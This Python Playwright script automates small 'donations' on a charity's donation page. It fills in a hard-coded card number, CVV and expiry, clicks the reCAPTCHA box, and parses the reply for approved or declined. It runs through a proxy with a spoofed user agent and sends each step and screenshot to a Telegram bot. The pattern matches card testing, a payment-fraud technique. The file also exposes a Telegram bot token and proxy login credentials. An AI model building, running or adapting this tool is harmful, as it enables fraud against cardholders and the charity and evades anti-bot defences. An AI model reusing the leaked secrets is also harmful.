#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v10 — fill stable, amount update, captcha last
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
ADDRESS_2 = "Apt 12"
CITY = "Carifnia"
STATE_VALUE = "1305"
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"

P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"


def sid(name):
    return f'[id="{P}{name}"]'


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def dump_frames(page, label="FRAMES", deep=False):
    try:
        info = []
        for i, f in enumerate(page.frames):
            try:
                info.append(f"#{i} name='{f.name or ''}' url='{(f.url or '')[:80]}'")
            except Exception:
                info.append(f"#{i} (unreadable)")
        tg_msg(f"📋 {label} ({len(info)}):\n" + "\n".join(info))
    except Exception as e:
        tg_msg(f"⚠️ dump_frames: {e}")


def find_donation_frame(page, total_seconds=120):
    start = time.time()
    attempt = 0
    while time.time() - start < total_seconds:
        attempt += 1
        for f in page.frames:
            try:
                if f.locator('[id*="datafirst"]').first.count() > 0:
                    tg_msg(f"✅ Found form in frame name='{f.name}'")
                    return f, attempt
            except Exception:
                pass
            try:
                if f.locator('[id*="cardNumber"]').first.count() > 0:
                    tg_msg(f"✅ Found card field in frame name='{f.name}'")
                    return f, attempt
            except Exception:
                pass
        if attempt % 10 == 0:
            dump_frames(page, f"Attempt {attempt}", deep=True)
        time.sleep(2)
    return None, attempt


def safe_fill(frame, selector, value, label=""):
    """
    ملء آمن: fill() + input event فقط
    بدون change/blur لتجنب AJAX re-render
    """
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=10000)
        el.fill(str(value), timeout=5000)
        el.evaluate("""el => {
            el.dispatchEvent(new Event('input', {bubbles: true}));
        }""")
        time.sleep(0.3)
        actual = el.input_value(timeout=3000)
        ok = (actual == str(value))
        tg_msg(f"{'✅' if ok else '⚠️'} {label or selector}: '{actual}'" + ("" if ok else f" (wanted '{value}')"))
        return ok
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def fill_with_js(frame, field_suffix, value, label=""):
    """ملء مباشر عبر JS — أكثر أماناً للـ PrimeFaces"""
    try:
        ok = frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.focus();
                el.value = val;
                el.dispatchEvent(new Event('input', {bubbles: true}));
                return true;
            }""",
            [f"{P}{field_suffix}", str(value)]
        )
        if ok:
            # تحقق
            actual = frame.evaluate(
                """(id) => {
                    const el = document.getElementById(id);
                    return el ? el.value : null;
                }""",
                f"{P}{field_suffix}"
            )
            ok2 = (actual == str(value))
            tg_msg(f"{'✅' if ok2 else '⚠️'} {label or field_suffix} (JS): '{actual}'")
            return ok2
        else:
            tg_msg(f"❌ {label or field_suffix} (JS): element not found")
            return False
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix} (JS): {str(e)[:150]}")
        return False


def select_option(frame, selector, value, label="", by_label=False):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="attached", timeout=10000)
        if by_label:
            el.select_option(label=str(value), timeout=5000)
        else:
            el.select_option(value=str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('change',{bubbles:true}))")
        tg_msg(f"✅ {label or selector}: selected")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def click(frame, selector, label=""):
    try:
        el = frame.locator(selector).first
        el.wait_for(state="visible", timeout=10000)
        el.click(timeout=5000)
        tg_msg(f"✅ {label or selector}: clicked")
        return True
    except Exception as e:
        tg_msg(f"❌ {label or selector}: {str(e)[:150]}")
        return False


def check_reject_in_text(text):
    for line in text.split("\n"):
        l = line.strip()
        if "REJECT" in l.upper() or "DECLINED" in l.upper():
            return l
    return None


# ═══════════════════════════════════════════════════
#  خطوات محددة
# ═══════════════════════════════════════════════════

def set_amount(frame, amount):
    """يختار Other + يحط المبلغ + يستنى label يتحدث"""
    tg_msg(f"🔄 Setting amount = {amount}")

    # 1) اضغط Other radio
    try:
        r = frame.locator(sid("rb_amount:4")).first
        r.wait_for(state="visible", timeout=10000)
        r.check(timeout=5000)
        tg_msg("✅ Other radio checked")
        # شغل حدث change لـ PrimeFaces
        r.evaluate("el => el.dispatchEvent(new Event('change',{bubbles:true}))")
    except Exception as e:
        tg_msg(f"⚠️ Other radio: {str(e)[:120]}")

    time.sleep(4)

    # 2) املأ المبلغ بـ JS
    frame.evaluate(
        """(amt) => {
            const el = document.querySelector('input[id*="other_amount"]');
            if (!el) return false;
            el.focus();
            el.value = amt;
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            el.blur();
            return true;
        }""",
        str(amount)
    )
    tg_msg(f"✅ amount value = {amount} (JS)")
    time.sleep(3)

    # 3) استنى label_total_amount يتحدث
    for i in range(15):
        try:
            total = frame.evaluate("""() => {
                const lt = document.getElementById('label_total_amount');
                return lt ? lt.value : null;
            }""")
            if total and "$ 0.00" not in total and "0.00" not in total.replace("$ ", ""):
                tg_msg(f"✅ total updated: {total}")
                break
        except Exception:
            pass
        time.sleep(1)

    # 4) تحقق نهائي
    try:
        check = frame.evaluate(
            """() => {
                const oa = document.querySelector('input[id*="other_amount"]');
                const lt = document.getElementById('label_total_amount');
                const lh = document.getElementById('label_total_hidden_amount');
                return {
                    other_value: oa ? oa.value : null,
                    total_label: lt ? lt.value : null,
                    total_hidden: lh ? lh.value : null,
                };
            }"""
        )
        tg_msg(f"📋 Amount check: {json.dumps(check, ensure_ascii=False)}")
    except Exception as e:
        tg_msg(f"⚠️ amount check: {str(e)[:120]}")


def fill_donor_info(frame):
    """بيانات المتبرع — بدون card"""
    tg_msg("🔄 [4] Filling donor info...")

    # نستخدم fill_with_js للجميع لضمان القيمة
    fill_with_js(frame, "datafirst", FIRST_NAME, "First name")
    fill_with_js(frame, "datalast", LAST_NAME, "Last name")
    fill_with_js(frame, "email", EMAIL, "Email")
    fill_with_js(frame, "data_phone", PHONE, "Phone")
    fill_with_js(frame, "data_address_one", ADDRESS_1, "Address")
    fill_with_js(frame, "data_address_two", ADDRESS_2, "Apt/Suite")
    fill_with_js(frame, "data_address_city", CITY, "City")
    fill_with_js(frame, "data_address_zip", ZIP, "Zip")

    # Country
    try:
        us_value = frame.evaluate(f"""() => {{
            const sel = document.querySelector('select[id="{P}data_Rcountry"]');
            if (!sel) return null;
            for (const o of sel.options) {{
                const t = o.text.trim().toLowerCase();
                if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
            }}
            return null;
        }}""")
        if us_value:
            select_option(frame, sid("data_Rcountry"), us_value, f"Country (US={us_value})")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:150]}")

    # State — نستخدم JS + change
    try:
        frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.value = val;
                el.dispatchEvent(new Event('change', {bubbles: true}));
                return true;
            }""",
            [f"{P}data_Rstate", STATE_VALUE]
        )
        tg_msg(f"✅ State (CA) set via JS")
    except Exception as e:
        tg_msg(f"⚠️ State JS: {str(e)[:120]}")


def find_card_type_select(frame):
    """يدور على select اللي فيه MasterCard"""
    try:
        sel_info = frame.evaluate("""() => {
            const results = [];
            document.querySelectorAll('select').forEach(el => {
                const opts = Array.from(el.options).map(o => o.value);
                if (opts.includes('MasterCard') || opts.includes('Visa') || opts.includes('Amex')) {
                    results.push({id: el.id, name: el.name, options: opts});
                }
            });
            return results;
        }""")
        tg_msg(f"🔎 card type selects: {json.dumps(sel_info, ensure_ascii=False)[:500]}")
        return sel_info
    except Exception as e:
        tg_msg(f"⚠️ card type scan: {str(e)[:120]}")
        return []


def fill_card_info(frame):
    """البطاقة — نستخدم JS مباشرة لتجنب re-render"""
    tg_msg("🔄 [5] Filling card info (JS-based, stable)")

    # 1) الاسم
    fill_with_js(frame, "nameOnCard", CARD_NAME, "Card name")

    # 2) رقم البطاقة — JS
    fill_with_js(frame, "cardNumber", CARD_NUMBER, "Card number")

    # 3) CVV — JS
    fill_with_js(frame, "cardCSV", CARD_CVV, "CVV")

    # 4) cardType — ندوّر على select اللي فيه MasterCard
    card_type_sel = find_card_type_select(frame)
    if card_type_sel:
        target = card_type_sel[0]
        try:
            el = frame.locator(f'[id="{target["id"]}"]').first
            el.select_option(value=CARD_TYPE, timeout=5000)
            el.evaluate("el => el.dispatchEvent(new Event('change',{bubbles:true}))")
            tg_msg(f"✅ Card type selected in '{target['id']}'")
        except Exception as e:
            tg_msg(f"⚠️ card type: {str(e)[:120]}")
    else:
        # جرّب cardType بالـ id الأصلي
        try:
            frame.evaluate(
                """([id, val]) => {
                    const el = document.getElementById(id);
                    if (!el) return false;
                    el.value = val;
                    el.dispatchEvent(new Event('change', {bubbles: true}));
                    return true;
                }""",
                [f"{P}cardType", CARD_TYPE]
            )
            tg_msg("✅ card type via JS (fallback)")
        except Exception as e:
            tg_msg(f"⚠️ card type JS: {str(e)[:120]}")

    # 5) الشهر والسنة
    select_option(frame, sid("expiration_date_month"), CARD_MONTH, "Exp month")
    select_option(frame, sid("expiration_date_year"), CARD_YEAR, "Exp year")


def solve_captcha_once(frame, page):
    """يحل reCAPTCHA مرة واحدة قبل الـ Submit"""
    tg_msg("🔄 [7] reCAPTCHA — single attempt before submit")

    # تحقق من التوكن الحالي
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 Current token len = {len(token) if token else 0}")
        if token and len(token) > 20:
            tg_msg("✅ reCAPTCHA already solved")
            return True
    except Exception:
        pass

    # اضغط على checkbox الـ reCAPTCHA
    try:
        recaptcha_found = False
        for f in page.frames:
            try:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    recaptcha_found = True
                    cb = f.locator("#recaptcha-anchor").first
                    cb.wait_for(state="attached", timeout=8000)
                    cb.click(force=True, timeout=5000)
                    tg_msg("✅ Clicked reCAPTCHA checkbox")
                    break
            except Exception:
                continue

        if not recaptcha_found:
            tg_msg("⚠️ reCAPTCHA anchor frame not found")
            return False

        # استنى التوكن
        for i in range(20):
            try:
                token = frame.evaluate("""() => {
                    const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
                    return ta ? ta.value : '';
                }""")
                if token and len(token) > 20:
                    tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
                    return True
            except Exception:
                pass
            time.sleep(1)

        tg_msg("⚠️ reCAPTCHA still empty after 20s")
        return False
    except Exception as e:
        tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")
        return False


def run():
    tg_msg("🚀 Gift of Life Donation v10 — Start")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    # 1. فتح الصفحة
    tg_msg("🔄 [1] Opening page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(10)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    # 2. ابحث عن الـ frame
    tg_msg("🔄 [2] Searching for form fields in ANY frame...")
    frame, attempts = find_donation_frame(page, 120)
    if not frame:
        tg_msg("❌ no frame with fields — reload")
        try:
            page.reload(wait_until="domcontentloaded", timeout=60000)
            time.sleep(15)
        except Exception:
            pass
        frame, attempts = find_donation_frame(page, 90)
    if not frame:
        tg_msg("❌ still not found")
        dump_frames(page, "FINAL", deep=True)
        return

    tg_msg(f"✅ using frame name='{frame.name}' attempts={attempts}")
    time.sleep(5)

    # 3. المبلغ
    set_amount(frame, DONATION_AMOUNT)

    # 4. بيانات المتبرع
    fill_donor_info(frame)

    # 5. البطاقة (JS-based لتجنب re-render)
    fill_card_info(frame)

    # 6. screenshot
    try:
        page.screenshot(path="/tmp/before_captcha.png", full_page=True)
        tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
    except Exception:
        pass

    # 7. reCAPTCHA — مرة واحدة قبل Submit
    captcha_ok = solve_captcha_once(frame, page)

    # 8. Pre-submit state
    tg_msg("🔄 [8] Verifying before submit...")
    try:
        vals = frame.evaluate(f"""() => {{
            const g = (n) => {{
                const el = document.getElementById('{P}' + n);
                return el ? el.value : null;
            }};
            const oa = document.querySelector('input[id*="other_amount"]');
            const lt = document.getElementById('label_total_amount');
            return {{
                first: g('datafirst'),
                last: g('datalast'),
                email: g('email'),
                phone: g('data_phone'),
                addr1: g('data_address_one'),
                addr2: g('data_address_two'),
                city: g('data_address_city'),
                zip: g('data_address_zip'),
                state: g('data_Rstate'),
                country: g('data_Rcountry'),
                card_name: g('nameOnCard'),
                card_num_len: (g('cardNumber') || '').length,
                cvv_len: (g('cardCSV') || '').length,
                exp_month: g('expiration_date_month'),
                exp_year: g('expiration_date_year'),
                card_type: g('cardType'),
                other_amount: oa ? oa.value : null,
                total_label: lt ? lt.value : null,
                recaptcha_len: (g('g-recaptcha-response') || '').length,
            }};
        }}""")
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    if not captcha_ok:
        tg_msg("⛔ captcha not solved — submit will likely fail")

    # 9. Submit
    tg_msg("🔄 [9] Clicking Submit...")
    if not click(frame, sid("j_idt1913"), "Submit"):
        try:
            frame.evaluate(f"""() => {{
                const btn = document.getElementById('{P}j_idt1913');
                if (btn) btn.click();
            }}""")
            tg_msg("✅ JS click")
        except Exception:
            pass

    time.sleep(10)

    # 10. النتيجة
    tg_msg("🔄 [10] Reading result...")
    time.sleep(10)

    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    final_result = None
    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        r = check_reject_in_text(iframe_text)
        if r:
            final_result = r
            tg_msg(f"⛔ SERVER REJECT: {r}")
    except Exception:
        pass

    if not final_result:
        try:
            main_text = page.evaluate("document.body.innerText")
            r = check_reject_in_text(main_text)
            if r:
                final_result = r
                tg_msg(f"⛔ SERVER REJECT (main): {r}")
        except Exception:
            pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification","limit","enter"]):
                lines.append(l)
        if lines:
            tg_msg("📊 Result:\n" + "\n".join(lines[:25]))
        else:
            tg_msg("⚠️ no keywords. iframe preview:\n<pre>" + iframe_text[:1500] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ read: {str(e)[:150]}")

    if final_result:
        tg_msg(f"🏁 FINAL RESULT: {final_result}")
    else:
        tg_msg("🏁 FINAL RESULT: unknown (check screenshot)")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
